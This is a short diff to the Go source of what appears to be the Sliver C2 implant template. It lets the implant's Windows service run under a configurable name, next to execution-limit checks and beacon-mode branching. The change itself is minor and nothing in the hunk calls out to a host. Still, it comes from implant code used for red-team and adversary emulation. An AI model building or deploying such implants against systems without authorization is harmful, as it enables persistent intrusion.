@@ -119,7 +119,7 @@ func Main() {
 	limits.ExecLimits() // Check to see if we should execute
 
 	// {{if .Config.IsService}}
-	svc.Run("", &sliverService{})
+	svc.Run("{{if .Config.ServiceName}}{{.Config.ServiceName}}{{else}}{{end}}", &sliverService{})
 	// {{else}}
 
 	// {{if .Config.IsBeacon}}
